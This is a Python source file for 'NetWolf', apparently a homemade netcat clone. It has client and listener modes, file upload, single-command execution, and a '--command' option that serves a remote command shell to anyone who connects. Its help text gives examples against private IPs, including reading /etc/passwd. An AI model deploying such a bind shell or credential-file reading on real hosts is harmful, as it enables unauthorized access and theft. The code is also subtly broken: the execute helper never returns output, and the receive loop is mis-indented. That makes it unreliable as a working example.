import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    ## runs command on local OS and then returns output from that command
    output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT)

## The main class, where all the magic happens
class NetWolf:

    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    ## 
    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        ## if there's a buffer, send it to the target first
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            ## loop to receive data from the target
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()

                    ## if there ain't data anymore, break out of the loop
                    if recv_len < 4096:
                        break
                    if response:
                        print(response)
                        buffer = input('> ')
                        buffer += '\n'
                        self.socket.send(buffer.encode())

        except KeyboardInterrupt:
            print('\nUser terminated.')
            self.socket.close()
            sys.exit()

    ## listener flag
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        try:
            while True:
                client_socket, _ = self.socket.accept()
                client_thread = threading.Thread(
                    target=self.handle, args=(client_socket,)
                )
                client_thread.start()
        except Exception as e:
            print(f'Error detected, details:\n{e}')
            self.socket.close()
            sys.exit()

            
    ## executes tasks corresponding to set flags/options
    def handle(self, client_socket):

        ## --execute, executes the one command and returns the output
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        ## --upload, uploads the desired file
        elif self.args.upload:
            file_buffer = b''
            ## loop to listen for content on the listening socket and receive data til there's no more data coming in
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break

            ## open the desired file, and send it
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        ## --command, spawns a shell
        elif self.args.command:
            cmd_buffer = b''
            ## loop until user manually cuts off the loop
            while True:
                try:
                    client_socket.send(b'[Wolf]: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'Server killed. Code: {e}')
                    self.socket.close()
                    sys.exit()


if __name__ == '__main__':


    ## make CLI
    parser = argparse.ArgumentParser(

        description = 'NetWolf',
        formatter_class = argparse.RawDescriptionHelpFormatter,
        epilog = textwrap.dedent('''Example:
            netwolf.py -t 192.168.0.4 -p 1234 -l -c #command shell
            netwolf.py -t 192.168.0.4 -p 1234 -l -u=mytest.txt ## upload to file
            netwolf.py -t 192.168.0.4 -p 1234 -l -e=\"cat /etc/passwd\" ## execute one commmand
            echo 'laxative' | ./netwolf.py -t 192.168.0.1 -p 1234 ## echo desired text to the server port 1234
            netwolf.py -t 192.168.0.4 -p 1234 ## connect to server''')

        )
    
    ## adds the flags/options
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='act as a listener')
    parser.add_argument('-p', '--port', type=int, default=1234, help='tell what port to listen to')
    parser.add_argument('-t', '--target', default='192.168.0.1', help='tell what IP is the target')
    parser.add_argument('-u', '--upload', help='upload a spicy file')

    args = parser.parse_args()

    ## if flag/option is set as listener, then invoke NetWolf with empty buffer, otherwise send buffer content from stdin
    if args.listen:
        buffer = ''
    else:
        try:
            buffer = sys.stdin.read()
        except Exception as e:
            print(f'There was a predicament when trying to do so. Details:\n{e}')

    nw = NetWolf(args, buffer.encode())
    nw.run()